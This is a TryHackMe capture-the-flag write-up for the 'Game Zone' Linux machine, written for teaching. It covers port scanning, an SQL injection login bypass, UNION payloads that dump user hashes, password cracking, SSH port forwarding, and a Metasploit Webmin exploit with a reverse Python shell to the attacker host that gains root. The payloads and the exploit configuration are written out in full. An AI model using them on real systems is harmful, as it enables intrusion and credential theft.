---
layout: post
title: THM Game Zone WriteUp
date: 2025-03-03
categories:
  - TryHackMe
  - TryHackMe-Linux
tags:
  - CTF
  - TryHackMe
  - Linux
  - SQL-Injection
  - Privilege-Escalation
  - Reverse-SSH-Tunneling
  - Webmin-Exploitation
  - Password-Cracking
media_subpath: /assets/img/GameZone
---
![Desktop View](GameZone.jpeg){: w="400"  h="400" }



# GameZone Skills


>**GameZone** is an easy Linux machine where we will use the following skills:

- **Port Discovery**
- **Web Application Enumeration**
- **SQL Injection Exploitation**
- **Credential Harvesting from SQL Injection**
- **Password Cracking**
- **SSH Enumeration and Access**
- **Reverse SSH Tunneling**
- **Webmin Enumeration**
- **Exploiting Webmin for Privilege Escalation**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **22** & port **80**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.236.19 -oG allPorts
Nmap scan report for 10.10.236.19
Host is up, received user-set (0.43s latency).
Scanned at 2025-03-03 15:16:04 CET for 21s
Not shown: 57408 closed tcp ports (reset), 8125 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p22,80 10.10.236.19 -oN targeted
Nmap scan report for 10.10.236.19
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Game Zone
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So we have to check the following ports & services:

- **Port 22 --> OpenSSH 7.2p2 Ubuntu 4ubuntu2.7**
- **Port  --> 80 Apache httpd 2.4.18**

Let's start with the **HTTP** service.

---
## Port 80 Enumeration

At first i ran `whatweb`,  to seek for some versions and technologies used in the website:

```bash
❯ whatweb 10.10.236.19
http://10.10.236.19 [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.236.19], PasswordField[password], Title[Game Zone]
```

Nothing really useful found, so let's take a look inside the website, once inside ***http://10.10.116.14***, seems like a gaming blog, we can see a login form a register button and a search field.

![Desktop View](GameZoneDashboard.png) 

Tickling the website a bit, we found that we can bypass the login field via **SQLI**.

When performing SQL Injection (SQLi) in the **username** field of a login form, the goal is often to bypass authentication by manipulating the SQL query rather than retrieving a password. This happens because of how the query is structured.

### **How Authentication Queries Work**

A typical SQL query for user authentication looks like this:

```sql
SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password';
```

If a valid record is found, the user is logged in.

---

### **How SQLi Works in the Username Field**

When an attacker inputs something like:

```
' OR '1'='1' -- 
```

The query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'input_password';
```

So the password validation becomes a comment, that's why we can login without retrieving a password. We will be login as the first user in the database.

Once logged we are in front of a **game review search box**.

![Desktop View](GameZoneSearchBox.png)

The first thing that comes to my mind is **SQL Injection**, once again, so let's try adding a `'` to the search box, in order to see if we see any errors.

![Desktop View](GameZoneSQLI1.png)

Bingo, we get a SQL error, that usually means that it's vulnerable to **SQL Injection**, let's keep digging.

We can enumerate the amount of columns, incrementing each time the number of columns.

```sql
1' union select 1-- - # Not worked
1' union select 1,2-- - # Not worked
1' union select 1,2,3-- - # Worked
```

![Desktop View](GameZoneSQLI2.png)

Once we know that the column 2 and 3 are vulnerable since we can see them in the response, let's use the third column since is the bigger one.

Let's query the databases names.

```sql
1' union select 1,2,group_concat(schema_name) from information_schema.schemata-- -
```

Once executed we can see the available databases.

![Desktop View](GameZoneSQLI3.png)

The `db` database seems juicy, so let's enumerate the tables of the database `db`.

```sql
1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="db"-- -
```

Once executed we can see 2 tables.

![Desktop View](GameZoneSQLI4.png)

The `users` table seems juicy, so let's query the columns.

```sql
1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users"-- -
```

![Desktop View](GameZoneSQLI5.png)

We can see 4 columns in total, but we are more interested in the `username` and `pwd` columns, so let's query the content of the columns.

```sql
1' union select 1,2,group_concat(username,0x3a,pwd) from db.users-- -
```

This will dump all the users and their password/hashes.

![Desktop View](GameZoneSQLI6.png)

There we go we have found a **user** and a **hash**: `agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

Let's try to crack the hash.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Press 'q' or Ctrl-C to abort, almost any other key for status
v***oga*****4    (agent47)     
```

Once cracked i used the credentials to log in in the website, but nothing new, the same search form, so let's try the credentials in the `ssh` service.

## Shell as Agent47

```bash
❯ ssh agent47@10.10.236.19
agent47@10.10.236.19's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Mon Mar  3 09:54:57 2025 from 10.14.99.119
agent47@gamezone:~$ whoami
agent47
```

Once logged as `agent47`, we can  read the `user.txt` flag inside `/home/agent47/root.txt`

```bash
agent47@gamezone:~$ cat /home/agent47/user.txt 
649a*****480ac13ef1e4fa*****c95c
```

Let's try to escalate privileges, i have made the usual checks, like `sudoers`, `SUID`, `Cron Jobs`, `Capabilities`, etc.

None of them seems to work, the only thing vulnerable is the `pkexec` SUID binary, but this is not the intended way to `root` this machine.

Finally i checked the **active connections**.

```bash
agent47@gamezone:~$ netstat -tunlp

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
udp        0      0 0.0.0.0:10000           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
```

We can see that there are more ports that are not accessible from the outside, i tried to login via `mysql` with the `agent47` credentials but it didn't work.

So the service running at port 10000, is the last thing we can check, in order to check it we need to **port forward** this port.

We can do it via ssh, since we own valid credentials.

```bash
❯ ssh -L 10000:localhost:10000 agent47@10.10.236.19
agent47@10.10.236.19's password: **************
```

Now we can scan the port with `nmap`.

```bash
❯ nmap -sCV -p10000 127.0.0.1
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000045s latency).

PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.580 (Webmin httpd)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Login to Webmin
```

We can see that we are facing a web server,  specifically a **Webmin 1.580**.

Accessing it via browser we can see a login form.

![Desktop View](GameZoneWebmin.png)

We can reuse `agent47` credentials in this login form.

Looking for publicly available exploits for `webmin 1.580` i found 2 exploits.

```bash
❯ searchsploit webmin 1.580
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                                                  | unix/remote/21851.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                                          | linux/webapps/47330.rb
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Both works under `metasploit`, so let's run it.

```bash
msfconsole
```

Once with the framework loaded, let's configure the exploit.

```bash
msf6 > use exploit/unix/webapp/webmin_show_cgi_exec
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payload cmd/unix/reverse_python
payload => cmd/unix/reverse_python
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set SSL false
SSL => false
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set USERNAME agent47
USERNAME => agent47
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set PASSWORD videogamer124
PASSWORD => videogamer124
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set lhost 10.14.99.119
lhost => 10.14.99.119
```

Once with the exploit configured, we just have to run it.

```bash
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run
[*] Started reverse TCP handler on 10.14.99.119:4444 
[*] Attempting to login...
[+] Authentication successful
[+] Authentication successful
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Command shell session 1 opened (10.14.99.119:4444 -> 10.10.236.19:50356) at 2025-03-03 17:24:16 +0100
```

Bingo, we got a `shell`, now let's see if we gained any privilege.

```bash
root@gamezone:/usr/share/webmin/file/# whoami
root
```

There we go, we have gained access as `root`.

We can now read the `root.txt` flag inside `/root/root.txt`.

```bash
root@gamezone:/usr/share/webmin/file/# cat /root/root.txt
a4b*****0144bdd71908d12*****deee
```

---
## Final Thoughts

The **Game Zone** machine offers a practical introduction to exploiting **SQL injection vulnerabilities** and understanding the significance of **password security**. The initial access phase emphasizes the importance of thorough **web application testing**, leading to the discovery of SQL injection points that can be leveraged to extract sensitive information. Privilege escalation involves utilizing **reverse SSH tunneling** to access internal services, such as **Webmin**, and exploiting known vulnerabilities to gain elevated privileges. This machine effectively reinforces essential skills in **web application security**, **password cracking**, and **service exploitation**, serving as a valuable exercise for those seeking to enhance their penetration testing capabilities.

![Desktop View](GameZonePwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

